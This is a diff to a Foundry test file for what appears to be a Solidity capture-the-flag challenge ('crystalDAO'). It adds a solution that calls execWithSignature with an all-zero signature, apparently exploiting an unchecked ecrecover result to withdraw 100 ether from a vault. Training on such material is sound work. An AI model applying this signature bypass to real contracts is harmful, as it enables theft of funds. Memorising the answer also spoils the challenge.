@@ -3,6 +3,7 @@
 pragma solidity ^0.8.0;
 
 import "forge-std/Test.sol";
+import {console} from "forge-std/console.sol";
 import {DaoVaultImplementation, FactoryDao, IDaoVault} from "../src/7_crystalDAO/crystalDAO.sol";
 
 /*////////////////////////////////////////////////////////////
@@ -41,7 +42,15 @@ contract Challenge7Test is Test {
         // terminal command to run the specific test:       //
         // forge test --match-contract Challenge7Test -vvvv //
         ////////////////////////////////////////////////////*/
-
+        vault.execWithSignature({
+            v: 0,
+            r: 0,
+            s: 0,
+            target: daoManager,
+            val: 100 ether,
+            execOrder: "",
+            deadline: type(uint256).max
+        });
         //==================================================//
         vm.stopPrank();
 
